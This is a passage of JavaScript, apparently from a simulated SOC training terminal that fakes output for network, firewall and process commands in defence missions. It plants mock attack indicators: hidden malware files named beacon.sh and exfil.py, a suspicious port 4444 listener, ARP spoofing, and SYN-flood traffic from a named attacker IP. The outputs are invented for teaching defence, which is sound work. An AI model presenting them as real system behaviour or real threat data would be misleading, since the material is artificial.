      result.output = [
        '               total        used        free      shared  buff/cache   available',
        `Mem:        16776192     8388608     2097152      524288     6291432     7864320`,
        'Swap:        4194304      262144     3932160',
      ];
      break;
    case 'df':
      result.output = [
        'Filesystem      Size  Used Avail Use% Mounted on',
        '/dev/sda1        40G   22G   16G  58% /',
        'tmpfs           8.0G  128K  8.0G   1% /dev/shm',
        '/dev/sda2       100G   67G   28G  71% /var',
        'overlay          40G   22G   16G  58% /var/lib/docker/overlay2',
      ];
      break;
    case 'netstat':
      result.output = generateNetstat(state);
      if (state?.ddos || state?.bruteforce) result.sideEffects.push({ type: 'mission_command', cmd: 'check_connections' });
      break;
    case 'ss':
      result.output = generateSS(state);
      if (state?.malware) result.sideEffects.push({ type: 'mission_command', cmd: 'check_sockets' });
      break;
    case 'ip': {
      if (args[0] === 'addr' || args[0] === 'a') result.output = generateIfconfig();
      else if (args[0] === 'route' || args[0] === 'r') result.output = ['default via 192.168.1.1 dev eth0 proto dhcp metric 100', '192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.11', '10.0.0.0/8 via 10.0.0.254 dev eth0'];
      else if (args[0] === 'neigh') result.output = ['192.168.1.1 dev eth0 lladdr 00:50:56:c0:00:01 REACHABLE', `${state?.mitm ? '192.168.1.1 dev eth0 lladdr de:ad:be:ef:00:01 STALE  <<< SUSPICIOUS (MAC changed!)' : ''}`].filter(Boolean);
      else result.output = ['ip: unknown object "' + args[0] + '"'];
      break;
    }
    case 'ifconfig':
      result.output = generateIfconfig();
      break;
    case 'ping': {
      const host = args[0] || 'localhost';
      const blocked = state?.blockedIPs?.includes(host);
      if (blocked) {
        result.output = [`PING ${host}: Request timeout for icmp_seq 0`, `PING ${host}: Request timeout for icmp_seq 1`, `--- ${host} ping statistics ---`, `3 packets transmitted, 0 packets received, 100.0% packet loss`];
      } else {
        const ms = Math.floor(Math.random() * 15) + 1;
        result.output = [`PING ${host} (${host}): 56 data bytes`, `64 bytes from ${host}: icmp_seq=0 ttl=64 time=${ms}.${Math.floor(Math.random() * 999)} ms`, `64 bytes from ${host}: icmp_seq=1 ttl=64 time=${ms + 1}.${Math.floor(Math.random() * 999)} ms`, `64 bytes from ${host}: icmp_seq=2 ttl=64 time=${ms}.${Math.floor(Math.random() * 999)} ms`, `--- ${host} ping statistics ---`, `3 packets transmitted, 3 packets received, 0.0% packet loss`];
      }
      break;
    }
    case 'traceroute': {
      const host = args[0] || 'google.com';
      result.output = [`traceroute to ${host}, 30 hops max, 60 byte packets`, ` 1  192.168.1.1  1.234 ms  0.987 ms  1.123 ms`, ` 2  10.0.0.1  2.456 ms  2.234 ms  2.678 ms`, ` 3  172.16.0.1  8.901 ms  9.234 ms  8.567 ms`, ` 4  * * *`, ` 5  ${host}  45.678 ms  44.234 ms  45.012 ms`];
      break;
    }
    case 'nmap': {
      const target = args.find(a => !a.startsWith('-')) || '192.168.1.11';
      result.sideEffects.push({ type: 'mission_command', cmd: 'nmap_scan' });
      result.output = [
        `Starting Nmap 7.93 ( https://nmap.org ) at ${DATE()}`,
        `Nmap scan report for ${target}`,
        'Host is up (0.0012s latency).',
        'Not shown: 994 closed tcp ports (conn-refused)',
        'PORT     STATE SERVICE    VERSION',
        '22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4',
        '80/tcp   open  http       nginx 1.24.0',
        '443/tcp  open  https      nginx 1.24.0',
        '5432/tcp open  postgresql PostgreSQL DB 14.0',
        ...(state?.malware ? ['4444/tcp open  krb524     (unknown)  <<< SUSPICIOUS'] : []),
        '',
        `Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`,
        `Nmap done: 1 IP address (1 host up) scanned in ${(Math.random() * 5 + 2).toFixed(2)} seconds`,
      ];
      break;
    }
    case 'tcpdump': {
      const iface = args[args.indexOf('-i') + 1] || 'eth0';
      result.sideEffects.push({ type: 'mission_command', cmd: 'tcpdump' });
      const attackerIP = '185.220.101.47';
      const pkts = state?.ddos ? 20 : 8;
      result.output = [`tcpdump: verbose output suppressed, use -v or -vv for full protocol decode`, `listening on ${iface}, link-type EN10MB (Ethernet), snapshot length 262144 bytes`];
      for (let i = 0; i < pkts; i++) {
        const ms = (Date.now() / 1000 + i * 0.1).toFixed(6);
        if (state?.ddos) result.output.push(`${ms} IP ${attackerIP}.${40000 + i * 100} > 192.168.1.11.80: Flags [S], seq ${Math.floor(Math.random() * 999999)}, win 65535, length 0`);
        else if (state?.mitm) result.output.push(`${ms} ARP, Request who-has 192.168.1.1 tell 192.168.1.99  <<< ARP SPOOFING`);
        else result.output.push(`${ms} IP 10.0.0.100.${50000 + i * 10} > 192.168.1.11.443: Flags [PA], seq 1:${1400 + i}, ack 1, win 64240`);
      }
      result.output.push(`^C${pkts} packets captured`);
      break;
    }
    case 'curl': {
      const url = args.find(a => !a.startsWith('-')) || '';
      result.output = url.includes('ifconfig.me') || url.includes('icanhazip')
        ? ['192.168.1.11']
        : url.includes('localhost') || url.includes('127.0.0.1')
        ? ['<!DOCTYPE html><html><head><title>Welcome to nginx!</title></head><body><h1>nginx/1.24.0</h1></body></html>']
        : [`curl: (7) Failed to connect to ${url}: Connection refused`];
      break;
    }
    case 'wget': {
      const url = args[0] || '';
      result.output = [`--${DATE()}--  ${url}`, `Connecting to ${url.split('/')[2]}... connected.`, `HTTP request sent, awaiting response... 200 OK`, `Length: 4096 (4.0K) [text/plain]`, `Saving to: 'output'`, `output 100%[===================>] 4.00K  --.-KB/s in 0s`, `${DATE()} (1.23 MB/s) - 'output' saved [4096/4096]`];
      break;
    }
    case 'ssh': {
      const target = args[0] || '';
      result.output = [`ssh: connect to host ${target} port 22: Connection established`, `Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)`, `Last login: ${DATE()} from 10.0.0.254`, `$`];
      break;
    }
    case 'iptables': {
      if (args.includes('-L') || args.includes('-list')) {
        result.output = generateIptables(state);
      } else if ((args.includes('-A') || args.includes('-I')) && (args.includes('DROP') || args.includes('REJECT'))) {
        const srcIdx = args.indexOf('-s');
        const ip = srcIdx >= 0 ? args[srcIdx + 1] : null;
        if (ip) {
          result.output = [`[  firewall  ] Rule added: DROP all from ${ip}`, `iptables: Rule added successfully`];
          result.sideEffects.push({ type: 'block_ip', ip }, { type: 'mission_command', cmd: 'block_ip' });
        } else {
          const portMatch = rawInput.match(/--dport\s+(\d+)/);
          const hasLimit = rawInput.includes('--limit');
          if (hasLimit) {
            result.output = ['iptables: Rate limiting rule applied'];
            result.sideEffects.push({ type: 'rate_limit' }, { type: 'mission_command', cmd: 'rate_limit' });
          } else {
            result.output = ['iptables: Rule added'];
          }
        }
      } else if (args.includes('-F') || args.includes('--flush')) {
        result.output = ['iptables: All rules flushed'];
        result.sideEffects.push({ type: 'flush_rules' });
      } else {
        result.output = generateIptables(state);
      }
      break;
    }
    case 'ufw': {
      if (args[0] === 'status') {
        result.output = generateUfwStatus(state);
      } else if (args[0] === 'deny') {
        const ip = args.find(a => /\d+\.\d+\.\d+\.\d+/.test(a));
        if (ip) {
          result.output = [`Rule added: deny from ${ip}`, `Firewall updated`];
          result.sideEffects.push({ type: 'block_ip', ip }, { type: 'mission_command', cmd: 'block_ip' });
        } else {
          result.output = ['ufw: Rule added'];
        }
      } else if (args[0] === 'enable') {
        result.output = ['Firewall is active and enabled on system startup'];
      } else if (args[0] === 'allow') {
        result.output = [`Rule added: allow ${args[1] || 'any'}`];
      } else {
        result.output = generateUfwStatus(state);
      }
      break;
    }
    case 'fail2ban-client': {
      if (args[0] === 'status') {
        const jail = args[1] || 'sshd';
        result.output = [`Status for the jail: ${jail}`, `|- Filter`, `|  |- Currently failed:\t${Math.floor(Math.random() * 50) + 10}`, `|  |- Total failed:\t${Math.floor(Math.random() * 5000) + 1000}`, `|  \`- File list:\t/var/log/auth.log`, `\`- Actions`, `   |- Currently banned:\t${state?.blockedIPs?.length || 0}`, `   |- Total banned:\t${Math.floor(Math.random() * 100) + 10}`, `   \`- Banned IP list:\t${state?.blockedIPs?.join(' ') || 'none'}`];
      } else if (args[0] === 'set' && args[2] === 'banip') {
        const ip = args[3];
        result.output = [`1`, `[fail2ban] Banned ${ip} in jail ${args[1]}`];
        result.sideEffects.push({ type: 'block_ip', ip: ip || '' }, { type: 'mission_command', cmd: 'block_ip' });
      } else if (args[0] === 'set' && args[2] === 'unbanip') {
        result.output = ['1'];
      } else {
        result.output = ['fail2ban-client: usage: fail2ban-client [OPTIONS] <COMMAND>'];
      }
      break;
    }
    case 'systemctl': {
      const action = args[0];
      const service = args[1] || '';
      if (action === 'status') {
        const statuses = { nginx: '● nginx.service - A high performance web server\n   Loaded: loaded (/lib/systemd/system/nginx.service; enabled)\n   Active: active (running) since ' + DATE(), sshd: '● ssh.service - OpenBSD Secure Shell server\n   Loaded: loaded (/lib/systemd/system/ssh.service; enabled)\n   Active: active (running)', fail2ban: '● fail2ban.service - Fail2Ban Service\n   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled)\n   Active: active (running)', docker: '● docker.service - Docker Application Container Engine\n   Loaded: loaded (/lib/systemd/system/docker.service; enabled)\n   Active: active (running)' };
        result.output = (statuses[service] || `● ${service}.service - ${service}\n   Loaded: not-found\n   Active: inactive (dead)`).split('\n');
      } else if (action === 'restart') {
        result.output = [`[systemd] Restarting ${service}...`, `[  OK  ] Restarted ${service}`];
        result.sideEffects.push({ type: 'restart_service', service }, { type: 'mission_command', cmd: 'restart_service' });
      } else if (action === 'stop') {
        result.output = [`[systemd] Stopped ${service}`];
        result.sideEffects.push({ type: 'stop_service', service });
      } else if (action === 'start') {
        result.output = [`[  OK  ] Started ${service}`];
      } else if (action === 'list-units' || action === 'list') {
        result.output = ['UNIT                       LOAD   ACTIVE SUB     DESCRIPTION', 'nginx.service              loaded active running A high performance web server', 'ssh.service                loaded active running OpenBSD Secure Shell server', 'fail2ban.service           loaded active running Fail2Ban Service', 'docker.service             loaded active running Docker Application Container Engine', 'suricata.service           loaded active running Suricata IDS'];
      } else {
        result.output = [`systemctl: ${action} ${service}`];
      }
      break;
    }
    case 'kill': {
      const pidStr = args.find(a => !a.startsWith('-'));
      const pid = parseInt(pidStr);
      if (pid === 4829 || pid === 4830) {
        result.output = [`[  OK  ] Killed process ${pid} (svchost32)`];
        result.sideEffects.push({ type: 'kill_process', pid }, { type: 'mission_command', cmd: 'kill_malware' });
      } else if (pid) {
        result.output = [`kill: (${pid}) sent signal ${args.includes('-9') ? 9 : 15}`];
      } else {
        result.output = ['kill: usage: kill [-s sigspec | -n signum | -sigspec] jobspec or pid'];
        result.error = true;
      }
      break;
    }
    case 'killall': {
      const procName = args[0] || '';
      if (procName === 'svchost32' || procName.includes('hidden')) {
        result.output = [`[  OK  ] Killed all processes: ${procName}`];
        result.sideEffects.push({ type: 'kill_process', pid: 4829 }, { type: 'mission_command', cmd: 'kill_malware' });
      } else {
        result.output = [`killall: no process found: ${procName}`];
      }
      break;
    }
    case 'rm': {
      const file = args.find(a => !a.startsWith('-')) || '';
      if (file.includes('/tmp/.hidden') || file.includes('svchost32') || file.includes('beacon.sh')) {
        result.output = [`removed '${file}'`];
        result.sideEffects.push({ type: 'mission_command', cmd: 'remove_malware' });
      } else if (args.includes('-rf') || args.includes('-fr')) {
        result.output = [`removed directory '${file}'`];
      } else {
        result.output = [`rm: cannot remove '${file}': Permission denied`];
        result.error = true;
      }
      break;
    }
    case 'find': {
      const path = args[0] || '/';
      const nameArg = args[args.indexOf('-name') + 1] || args[args.indexOf('-iname') + 1];
      if (path === '/tmp' || path.includes('hidden') || nameArg?.includes('*.sh') || nameArg?.includes('*.py')) {
        result.output = ['/tmp/.hidden/svchost32', '/tmp/.hidden/beacon.sh', '/tmp/.hidden/exfil.py'];
        result.sideEffects.push({ type: 'mission_command', cmd: 'find_malware' });
      } else {
        result.output = [`find: ${path}: 0 matching files`];
      }
      break;
    }
    case 'crontab': {
      if (args.includes('-l')) {
        result.output = (FILE_CONTENTS['/etc/crontab'](state)).split('\n');
        if (state?.malware) result.sideEffects.push({ type: 'mission_command', cmd: 'check_crontab' });
      } else if (args.includes('-e')) {
        result.output = ['[editor] crontab -e: Opening crontab in editor (simulated)'];
      } else {
        result.output = ['crontab: usage: crontab [-u user] [-l | -r | -e] [file]'];
      }
      break;
    }
    case 'arp': {
      if (args.includes('-n') || args.includes('-a') || args.length === 0) {
        result.output = [
          'Address                  HWtype  HWaddress           Flags Mask            Iface',
          '192.168.1.1              ether   00:50:56:c0:00:01   C                     eth0',
          ...(state?.mitm ? ['192.168.1.1              ether   de:ad:be:ef:00:01   C                     eth0  <<< DUPLICATE (SPOOFED!)'] : []),
          '192.168.1.12             ether   08:00:27:4e:67:b2   C                     eth0',
          '10.0.0.254               ether   00:50:56:c0:00:fe   C                     eth0',
        ];
        if (state?.mitm) result.sideEffects.push({ type: 'mission_command', cmd: 'detect_arp_spoofing' });
      }
      break;
    }
    case 'docker': {
      const sub = args[0];
      if (sub === 'ps') {
        result.output = generateDockerPs();
      } else if (sub === 'logs') {
        result.output = [`[docker] Showing logs for ${args[1] || 'container'}...`, `2024-05-21T14:00:00Z INFO Starting service`, `2024-05-21T14:00:01Z INFO Listening on :8080`];
      } else if (sub === 'stop') {
        result.output = [`${args[1]}`];
      } else if (sub === 'exec') {
        result.output = ['[docker exec] Connecting to container...', 'root@container:/#'];
      } else if (sub === 'run') {
        result.output = [`[docker] Container started: ${args[args.length - 1]}`];
      } else {
        result.output = ['Usage: docker [OPTIONS] COMMAND', 'Management Commands: container, image, network, volume', 'Commands: ps, run, stop, exec, logs, inspect'];
      }
      break;
    }
    case 'history': {
      const hist = state?.history || [];
      result.output = hist.slice(-20).map((h, i) => `  ${String(hist.length - 20 + i + 1).padStart(3)}  ${h}`);
      break;
    }
    case 'clear':
      result.sideEffects.push({ type: 'clear_terminal' });
      result.output = [];
      break;
    case 'exit':
    case 'logout':
      result.output = ['logout'];
      result.sideEffects.push({ type: 'disconnect' });
      break;
    case 'echo':
      result.output = [args.join(' ')];
      break;
    case 'man': {
      const topic = args[0] || 'man';
      const manpages = {
        iptables: 'NAME: iptables - administration tool for IPv4/IPv6 packet filtering and NAT\nUSAGE: iptables -A INPUT -s <IP> -j DROP  (block IP)\n       iptables -A INPUT -p tcp --dport 22 -m limit --limit 5/min -j ACCEPT  (rate limit)',
        fail2ban: 'NAME: fail2ban-client - configure Fail2Ban\nUSAGE: fail2ban-client status sshd  (check jail status)\n       fail2ban-client set sshd banip <IP>  (ban IP)\n       fail2ban-client set sshd unbanip <IP>  (unban IP)',
        tcpdump: 'NAME: tcpdump - dump traffic on a network\nUSAGE: tcpdump -i eth0  (capture all traffic)\n       tcpdump -i eth0 port 22  (capture SSH)\n       tcpdump -i eth0 src 185.220.101.47  (filter by source)',
        nmap: 'NAME: nmap - Network exploration tool and security/port scanner\nUSAGE: nmap -sS <target>  (SYN scan)\n       nmap -sV <target>  (version detection)\n       nmap -sC <target>  (default scripts)',
        ufw: 'NAME: ufw - Uncomplicated Firewall\nUSAGE: ufw status  (check status)\n       ufw deny from <IP>  (block IP)\n       ufw allow 22/tcp  (allow SSH)',
      };
      result.output = (manpages[topic] || `No manual entry for ${topic}`).split('\n');
      break;
    }
    case 'help':
      result.output = [
        '╔═══════════════════ SOC LAB COMMAND REFERENCE ═══════════════════╗',
        '║ INVESTIGATION     │ LOG ANALYSIS          │ DEFENSE              ║',
        '║ ps aux            │ cat /var/log/auth.log  │ iptables -A INPUT    ║',
        '║ netstat -an       │ journalctl -u ssh      │   -s <IP> -j DROP    ║',
        '║ ss -tuln          │ tail -f /var/log/syslog│ ufw deny from <IP>   ║',
        '║ top               │ grep Failed auth.log   │ fail2ban-client set  ║',
        '║ nmap <target>     │ journalctl -f          │   sshd banip <IP>    ║',
        '║ tcpdump -i eth0   │                        │ systemctl restart    ║',
        '║ arp -n            │ find /tmp -name "*.sh" │   nginx              ║',
        '║ docker ps         │ crontab -l             │ kill -9 <PID>        ║',
        '╚═══════════════════════════════════════════════════════════════════╝',
        'Type "man <command>" for detailed help. Type "missions" to see scenarios.',
      ];
      break;
    case 'missions':
      result.output = ['Available training missions:', '  1. ssh-brute-force   [★☆☆] SSH Brute Force Defense', '  2. ddos-mitigation   [★★☆] DDoS Attack Mitigation', '  3. malware-hunt      [★★☆] Malware Investigation', '  4. network-forensics [★★★] Network Forensics (MITM)', '  5. ransomware-ir     [★★★] Ransomware Incident Response', '  6. phishing-response [★★☆] Phishing Email Investigation', '', 'Use the Mission Panel on the left to start a scenario.'];
      break;
    default:
      if (!cmd) { result.output = []; break; }
      result.output = [`bash: ${cmd}: command not found`];
      result.error = true;
      result.output.push(`Try 'help' for available commands or 'man ${cmd}' for documentation`);
  }

  if (ipMatch?.[1] && cmd !== 'iptables' && cmd !== 'ufw' && cmd !== 'fail2ban-client') {
    const ip = ipMatch[1];
    result.sideEffects.push({ type: 'block_ip', ip }, { type: 'mission_command', cmd: 'block_ip' });
  }

  return result;
}

export const COMMAND_COMPLETIONS = ['ls', 'cd', 'pwd', 'cat', 'grep', 'find', 'tail', 'head', 'echo', 'ping', 'traceroute', 'nmap', 'tcpdump', 'curl', 'wget', 'ssh', 'netstat', 'ss', 'ip', 'ifconfig', 'arp', 'iptables', 'ufw', 'fail2ban-client', 'systemctl', 'journalctl', 'ps', 'top', 'kill', 'killall', 'rm', 'find', 'crontab', 'docker', 'free', 'df', 'uname', 'whoami', 'id', 'uptime', 'w', 'date', 'history', 'clear', 'man', 'help', 'missions'];

export const FILE_COMPLETIONS = {
  '/var/log': ['auth.log', 'syslog', 'kern.log', 'fail2ban.log', 'ufw.log'],
  '/etc': ['hosts', 'passwd', 'hostname', 'resolv.conf', 'crontab'],
  '/tmp': ['.hidden'],
};
